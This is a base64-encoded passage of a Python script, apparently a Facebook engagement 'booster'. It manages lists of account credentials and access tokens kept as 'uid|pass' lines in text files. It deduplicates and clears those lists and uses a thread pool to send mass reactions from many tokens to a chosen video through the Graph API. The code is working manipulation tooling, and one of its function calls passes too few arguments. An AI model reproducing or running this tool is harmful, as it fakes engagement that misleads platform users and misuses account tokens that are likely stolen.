gICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxzZToKICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIEV4aXRpbmcuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzNtVEhFIEZPUk1BVCBTSE9VTEQgQkUgXDAzM1szMW11aWR8cGFzcyIpCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZmlsZV9wYXRoID0gaW5wdXQoZiIgICAgIFwwMzNbMzNtUEFUSDogIikuc3RyaXAoKQoKICAgIHByb3pjKGZpbGVfcGF0aCwgYWNjb3VudF9maWxlLCBleHRyYWN0X3R5cGUpCgpkZWYgcmVtb3ZlX2R1cGxpY2F0ZXMoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmaWxlX3BhdGhzID0gewogICAgICAgICIxIjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgIjIiOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgIjMiOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICAiNCI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgCiAgICBwcmludChmIiAgICAge3JlZH1DaG9vc2Ugd2hpY2ggZmlsZSB0byByZW1vdmUgZHVwbGljYXRlcyBmcm9tOiIpCiAgICBwcmludChmIiAgICAge3llbGxvd31bMV0gIHtibHVlfUZSQSBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7eWVsbG93fVsyXSAge2JsdWV9RlJBIFBBR0VTIikKICAgIHByaW50KGYiICAgICB7eWVsbG93fVszXSAge2JsdWV9UlBXIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9WzRdICB7Ymx1ZX1SUFcgUEFHRVMiKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge3doaXRlfUVudGVyIHlvdXIgY2hvaWNlOiAiKS5zdHJpcCgpCiAgICAKICAgIGlmIGNob2ljZSBub3QgaW4gZmlsZV9wYXRoczoKICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIFBsZWFzZSB0cnkgYWdhaW4uIikKICAgICAgICByZXR1cm4KICAgIAogICAgZmlsZV9wYXRoID0gZmlsZV9wYXRoc1tjaG9pY2VdCiAgICAKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgIAogICAgICAgIHNlZW5fdWlkcyA9IHNldCgpICAjIFRvIHN0b3JlIHVuaXF1ZSB1aWRzCiAgICAgICAgdW5pcXVlX2xpbmVzID0gW10KCiAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgICAgICMgU3BsaXQgdGhlIGxpbmUgaW50byAndWlkJyBhbmQgJ3Bhc3N3b3JkJwogICAgICAgICAgICBpZiAnfCcgaW4gbGluZToKICAgICAgICAgICAgICAgIHVpZCwgcGFzc3dvcmQgPSBsaW5lLnNwbGl0KCd8JywgMSkgICMgU3BsaXQgb25seSBhdCB0aGUgZmlyc3QgJ3wnCiAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlZW5fdWlkczoKICAgICAgICAgICAgICAgICAgICB1bmlxdWVfbGluZXMuYXBwZW5kKGxpbmUpICAjIEtlZXAgdGhlIGxpbmUgaWYgJ3VpZCcgaXMgdW5pcXVlCiAgICAgICAgICAgICAgICAgICAgc2Vlbl91aWRzLmFkZCh1aWQpICAjIEFkZCB0aGUgJ3VpZCcgdG8gdGhlIHNldAogICAgICAgIAogICAgICAgICMgV3JpdGUgdGhlIHVuaXF1ZSBsaW5lcyBiYWNrIHRvIHRoZSBmaWxlCiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgICAgICBmaWxlLndyaXRlbGluZXModW5pcXVlX2xpbmVzKQogICAgICAgIAogICAgICAgIHByaW50KGYiICAgICB7Z3JlZW59U3VjY2Vzc2Z1bGx5IHJlbW92ZWQgZHVwbGljYXRlcyBmcm9tOiB7ZmlsZV9wYXRofSIpCiAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIHByb2Nlc3Npbmcge2ZpbGVfcGF0aH06IHtzdHIoZSl9IikKCgojIENhbGwgdGhlIGZ1bmN0aW9uIHRvIHN0YXJ0IHRoZSBwcm9jZXNzCgoKIyBSRUFDVCAgCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKCmRlZiBwZXJmb3JtX3JlYWN0aW9uX3ZpZCh0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSwgcmVhY3Rpb25zX2NvdW50KToKICAgICIiIgogICAgU2VuZCBhIHJlYWN0aW9uIHVzaW5nIHRoZSBwcm92aWRlZCBhY2Nlc3MgdG9rZW4uCiAgICAKICAgIFBhcmFtZXRlcnM6CiAgICAtIHRva2VuOiBVc2VyJ3MgdG9rZW4gKGluIHRoZSBmb3JtYXQgZW1haWx8YWNjZXNzX3Rva2VuKQogICAgLSB1aWRfdXJsOiBUaGUgcG9zdCBJRCBvciBVUkwgZm9yIHRoZSByZWFjdGlvbgogICAgLSByZWFjdGlvbl90eXBlOiBUeXBlIG9mIHJlYWN0aW9uIChMSUtFLCBMT1ZFLCBldGMuKQogICAgLSByZWFjdGlvbnNfY291bnQ6IFRoZSBudW1iZXIgb2YgcmVhY3Rpb25zIHBlcmZvcm1lZCBzbyBmYXIKICAgIAogICAgUmV0dXJuczoKICAgIC0gYWNjZXNzX3Rva2VuOiBUaGUgYWNjZXNzIHRva2VuIHVzZWQgZm9yIHRoZSByZXF1ZXN0CiAgICAtIHN0YXR1c19jb2RlOiBIVFRQIHN0YXR1cyBjb2RlIHJldHVybmVkIGJ5IHRoZSByZXF1ZXN0CiAgICAtIHJlc3BvbnNlX3RleHQ6IFJlc3BvbnNlIGNvbnRlbnQgZnJvbSBGYWNlYm9vawogICAgIiIiCiAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbi5zcGxpdCgnfCcpWzFdICAjIEV4dHJhY3QgdGhlIGFjY2VzcyB0b2tlbiAoYXNzdW1pbmcgdGhlIGZvcm1hdCBpcyBlbWFpbHxhY2Nlc3NfdG9rZW4pCiAgICBhdXRvX3JlYWN0X3VybCA9IGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VpZF91cmx9L3JlYWN0aW9ucz90eXBlPXtyZWFjdGlvbl90eXBlfSZhY2Nlc3NfdG9rZW49e2FjY2Vzc190b2tlbn0nCiAgICAKICAgIHRyeToKICAgICAgICAjIFNlbmQgUE9TVCByZXF1ZXN0IHRvIEZhY2Vib29rJ3MgQVBJIHRvIGFkZCB0aGUgcmVhY3Rpb24KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoYXV0b19yZWFjdF91cmwpCiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUsIHJlc3BvbnNlLnRleHQgICMgUmV0dXJuIHJlc3VsdHMgZm9yIGZ1cnRoZXIgcHJvY2Vzc2luZwogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICMgSGFuZGxlIGFueSBleGNlcHRpb25zIHRoYXQgb2NjdXIgZHVyaW5nIHRoZSByZXF1ZXN0IChlLmcuLCBuZXR3b3JrIGlzc3VlcykKICAgICAgICByZXR1cm4gYWNjZXNzX3Rva2VuLCBOb25lLCBzdHIoZSkKCmRlZiBjbGVhcl90ZXh0X2ZpbGVzKCk6CiAgICAiIiIKICAgIENsZWFyIHRoZSBjb250ZW50cyBvZiBzcGVjaWZpZWQgdGV4dCBmaWxlcyBiYXNlZCBvbiB1c2VyIGNob2ljZS4KICAgICIiIgogICAgY2xlYXJfc2NyZWVuKCkgICMgQXNzdW1pbmcgY2xlYXJfc2NyZWVuIGlzIGRlZmluZWQgZWxzZXdoZXJlCiAgICBqb3ZhbigpICAgICAgICAgIyBBc3N1bWluZyBqb3ZhbiBpcyBkZWZpbmVkIGVsc2V3aGVyZQoKICAgICMgRGljdGlvbmFyeSBvZiBmaWxlIHBhdGhzIGZvciByZXNldHRpbmcKICAgIGZpbGVfcGF0aHMgPSB7CiAgICAgICAgIjEiOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAiMiI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAiMyI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgICI0IjogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CgogICAgcHJpbnQoZiIgICAgIHtibHVlfUNob29zZSBGaWxlIFRvIFJlc2V0OiIpCiAgICBwcmludChmIiAgICAge3llbGxvd31bMDFdICB7Ymx1ZX1GUkEgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3llbGxvd31bMDJdICB7Ymx1ZX1GUkEgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9WzAzXSAge2JsdWV9UlBXIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9WzA0XSAge2JsdWV9UlBXIFBBR0VTIikKICAgIHByaW50KGYiICAgICB7eWVsbG93fVswNV0gIHtibHVlfUFsbCBmaWxlcyIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICB1c2VyX2Nob2ljZSA9IGlucHV0KGYiICAgIHtyZWR9RW50ZXIgeW91ciBjaG9pY2U6ICIpLnN0cmlwKCkKCiAgICAjIENsZWFyIGFsbCBmaWxlcyBpZiBvcHRpb24gNSBpcyBzZWxlY3RlZAogICAgaWYgdXNlcl9jaG9pY2UgPT0gJzUnOgogICAgICAgIGZvciBmaWxlX3BhdGggaW4gZmlsZV9wYXRocy52YWx1ZXMoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpbGUudHJ1bmNhdGUoMCkgICMgQ2xlYXIgdGhlIGZpbGUgY29udGVudAogICAgICAgICAgICAgICAgcHJpbnQoZiJTdWNjZXNzZnVsbHkgY2xlYXJlZDoge2ZpbGVfcGF0aH0iKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIGNsZWFyaW5nIHtmaWxlX3BhdGh9OiB7c3RyKGUpfSIpCiAgICAgICAgcmV0dXJuCgogICAgIyBIYW5kbGUgY2xlYXJpbmcgYSBzaW5nbGUgZmlsZSBiYXNlZCBvbiB0aGUgdXNlcidzIGNob2ljZQogICAgc2VsZWN0ZWRfZmlsZSA9IGZpbGVfcGF0aHMuZ2V0KHVzZXJfY2hvaWNlKQogICAgaWYgc2VsZWN0ZWRfZmlsZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3BlbihzZWxlY3RlZF9maWxlLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBmaWxlLnRydW5jYXRlKDApICAjIENsZWFyIHRoZSBmaWxlIGNvbnRlbnQKICAgICAgICAgICAgcHJpbnQoZiJTdWNjZXNzZnVsbHkgY2xlYXJlZDoge3NlbGVjdGVkX2ZpbGV9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiRXJyb3IgY2xlYXJpbmcge3NlbGVjdGVkX2ZpbGV9OiB7c3RyKGUpfSIpCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCgpkZWYgcGVyZm9ybV9yZWFjdGlvbl9mYXN0X3ZpZCgpOgogICAgIiIiCiAgICBQZXJmb3JtIHJlYWN0aW9ucyBiYXNlZCBvbiB1c2VyIGlucHV0IGZvciBmaWxlIGNob2ljZSwgc3RhcnRpbmcgbGluZSwgcG9zdCBsaW5rLCByZWFjdGlvbiB0eXBlLCBhbmQgbnVtYmVyIG9mIHJlYWN0aW9ucy4KICAgICIiIgogICAgIyBEZWZpbmUgYXZhaWxhYmxlIGZpbGUgcGF0aHMKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICBjbGVhcl9zY3JlZW4oKSAgIyBBc3N1bWluZyBjbGVhcl9zY3JlZW4gaXMgZGVmaW5lZCBlbHNld2hlcmUKICAgIGpvdmFuKCkgICAgICAgICAjIEFzc3VtaW5nIGpvdmFuIGlzIGRlZmluZWQgZWxzZXdoZXJlCgogICAgIyBEaXNwbGF5IG9wdGlvbnMgdG8gdGhlIHVzZXIKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzAxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge2JsdWV9WzAyXSB7Z3JlZW59RlJBIFBBR0VTCiAgICAge2JsdWV9WzAzXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bMDRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSAge3JlZH0gRVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpICAKCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBMb2FkIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBGaWx0ZXIgb3V0IGVtcHR5IGxpbmVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBsb2FkaW5nIHRva2Vuczoge2V9IikKICAgICAgICByZXR1cm4KCiAgICBhdmFpbGFibGVfdG9rZW5zID0gbGVuKHRva2VucykKICAgIAogICAgaWYgYXZhaWxhYmxlX3Rva2VucyA9PSAwOgogICAgICAgIHByaW50KCJObyB0b2tlbnMgYXZhaWxhYmxlIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUuIikKICAgICAgICByZXR1cm4KCiAgICAjIFByb21wdCBmb3Igc3RhcnRpbmcgbGluZQogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUVudGVyIHRoZSBzdGFydGluZyBsaW5lIHtyZWR9KDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9e3JlZH0pOiAiKSkKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBsaW5lIG51bWJlciBiZXR3ZWVuIDEgYW5kIHthdmFpbGFibGVfdG9rZW5zfS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFNsaWNlIHRoZSB0b2tlbnMgYmFzZWQgb24gc3RhcnRpbmcgbGluZQogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0KCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgIHtncmVlbn1GT1JNQVQge3llbGxvd306IHtyZWR9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA3ODA0MzIyMjI2MC92aWRlb3MvNTM5NjczNzE1MTE5MTIyLz9taWJleHRpZD1yUzQwYUI3UzlVY2J4dzZ2IikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcG9zdF9saW5rID0gaW5wdXQoZiIgICB7Z3JlZW59RW50ZXIgdGhlIHBvc3QgbGluayBvciBJRDogIikKICAgIHVpZF91cmwgPSBleHRyYWN0X2ZhY2Vib29rX3ZpZGVvX2lkKHBvc3RfbGluaykgICMgQXNzdW1pbmcgVmlkZW9fRXh0cmFjdGlkIGlzIGRlZmluZWQgZWxzZXdoZXJlCgogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiIiICAgIHt5ZWxsb3d9Q2hvb3NlIHRoZSByZWFjdGlvbiB0eXBlOgogICAgIHtibHVlfVsxXSB7Z3JlZW59TElLRQogICAgIHtibHVlfVsyXSB7Z3JlZW59TE9WRQogICAgIHtibHVlfVszXSB7Z3JlZW59V09XCiAgICAge2JsdWV9WzRdIHtncmVlbn1TQUQKICAgICB7Ymx1ZX1bNV0ge2dyZWVufUFOR1JZCiAgICAge2JsdWV9WzZdIHtncmVlbn1IQUhBCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgCiAgICB0cnk6CiAgICAgICAgcmVhY3Rpb25fY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59Q2hvb3NlOiAiKSkKICAgICAgICByZWFjdGlvbl9tYXAgPSB7CiAgICAgICAgICAgIDE6ICJMSUtFIiwKICAgICAgICAgICAgMjogIkxPVkUiLAogICAgICAgICAgICAzOiAiV09XIiwKICAgICAgICAgICAgNDogIlNBRCIsCiAgICAgICAgICAgIDU6ICJBTkdSWSIsCiAgICAgICAgICAgIDY6ICJIQUhBIgogICAgICAgIH0KICAgICAgICByZWFjdGlvbl90eXBlID0gcmVhY3Rpb25fbWFwLmdldChyZWFjdGlvbl9jaG9pY2UsIE5vbmUpCiAgICAgICAgaWYgcmVhY3Rpb25fdHlwZSBpcyBOb25lOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCByZWFjdGlvbiBjaG9pY2UuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBHZXQgbnVtYmVyIG9mIHJlYWN0aW9ucwogICAgdHJ5OgogICAgICAgIG51bV9yZWFjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAgIHt5ZWxsb3d9RW50ZXIgdGhlIG51bWJlciBvZiByZWFjdGlvbnM6ICIpKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHJlYWN0aW9ucy4iKQogICAgICAgIHJldHVybgoKICAgICMgQ2hlY2sgaWYgcmVxdWVzdGVkIHJlYWN0aW9ucyBleGNlZWQgYXZhaWxhYmxlIHRva2VucwogICAgaWYgbnVtX3JlYWN0aW9ucyA+IGxlbih0b2tlbnMpOgogICAgICAgIHByaW50KGYie3JlZH1FTlRFUiBBR0FJTiBOT1QgZXhjZWVkaW5nIHtsZW4odG9rZW5zKX0iKQogICAgICAgIHJldHVybgoKICAgIHJlYWN0aW9uc19jb3VudCA9IDAKICAgIG1heF93b3JrZXJzID0gMTUgICMgU2V0IG1heGltdW0gbnVtYmVyIG9mIHRocmVhZHMKCiAgICB3aGlsZSByZWFjdGlvbnNfY291bnQgPCBudW1fcmVhY3Rpb25zIGFuZCB0b2tlbnM6CiAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9bWF4X3dvcmtlcnMpIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICAjIFN1Ym1pdCByZWFjdGlvbnMgZm9yIHRoZSBjdXJyZW50IGF2YWlsYWJsZSB0b2tlbnMKICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge2V4ZWN1dG9yLnN1Ym1pdChwZXJmb3JtX3JlYWN0aW9uX3ZpZCwgdG9rZW4sIHVpZF91cmwsIHJlYWN0aW9uX3R5cGUpOiB0b2tlbiBmb3IgdG9rZW4gaW4gdG9rZW5zfQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBhc19jb21wbGV0ZWQoZnV0dXJlX3RvX3Rva2VuKToKICAgICAgICAgICAgICAgIHRva2VuID0gZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4sIHN0YXR1c19jb2RlLCByZXNwb25zZV90ZXh0ID0gZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZWFjdGlvbnNfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgIHtncmVlbn1bU1VDQ0VTU10gU1VDQ0VTU0ZVTExZIFJFQUNURUQgVE8ge3doaXRlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgD4ge3JlZH17dWlkX3VybH0iKQogICAgICAgICAgICAgICAgICAgICAgICAjIENoZWNrIGlmIHdlJ3ZlIHJlYWNoZWQgdGhlIHN1Y2Nlc3MgbGltaXQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcmVhY3Rpb25zX2NvdW50ID49IG51bV9yZWFjdGlvbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhayAgIyBFeGl0IHRoZSBsb29wIGlmIHRoZSBkZXNpcmVkIG51bWJlciBvZiBzdWNjZXNzZnVsIHJlYWN0aW9ucyBpcyByZWFjaGVkCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICB7Z3JlZW59W0ZBSUxFRF0gRkFJTEVEIFRPIFNFTkQgUkVBQ1RJT04gIHt3aGl0ZX3ilIDilIDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZF91cmx9IikKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIHByb2Nlc3NpbmcgdG9rZW4ge3Rva2VufToge3N0cihlKX0iKQoKICAgICAgICAjIFJlbW92ZSB0aGUgdG9rZW5zIHRoYXQgd2VyZSBhdHRlbXB0ZWQgaW4gdGhpcyByb3VuZAogICAgICAgIHRva2VucyA9IHRva2Vuc1tsZW4oZnV0dXJlX3RvX3Rva2VuKTpdICAjIFVzZSB0b2tlbnMgZm9yIHRoZSBuZXh0IH